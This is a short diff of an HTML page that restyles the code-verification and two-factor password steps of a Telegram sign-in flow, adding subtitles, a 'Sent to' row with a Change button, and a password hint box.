@@ -50,7 +50,12 @@
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
                 </div>
                 <h2>Verify Identity</h2>
-                <p>Enter Telegram Code</p>
+                <p class="auth-subtitle">Enter Telegram Code</p>
+                <div id="code-target-row" class="auth-helper-row" style="display: none;">
+                    <span class="auth-helper-label">Sent to</span>
+                    <span id="code-target" class="auth-helper-pill"></span>
+                    <button type="button" class="auth-link" onclick="backToPhone()">Change</button>
+                </div>
                 <input id="entercode" class="code-input" type="text" placeholder="12345">
                 <button class="primary-btn" onclick="sendCode()">Verify</button>
             </div>
@@ -60,7 +65,10 @@
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11.536 16.464a.5.5 0 00-.496.568l.1 1.15a.5.5 0 01-.037.24l-1.352 3.863a.5.5 0 01-.47.315H7.5a.5.5 0 01-.5-.5v-2.204a.5.5 0 01.146-.354l3.298-3.297A6 6 0 0115 7z"/></svg>
                 </div>
                 <h2>Two-Factor Auth</h2>
-                <p id="hinttext" class="hint-text"></p>
+                <p class="auth-subtitle">Enter your Telegram password</p>
+                <div id="hint-box" class="auth-caption" style="display: none;">
+                    Hint: <span id="hinttext"></span>
+                </div>
                 <input id="enterpassword" type="password" placeholder="Password">
                 <button class="primary-btn" onclick="sendPassword()">Unlock</button>
             </div>
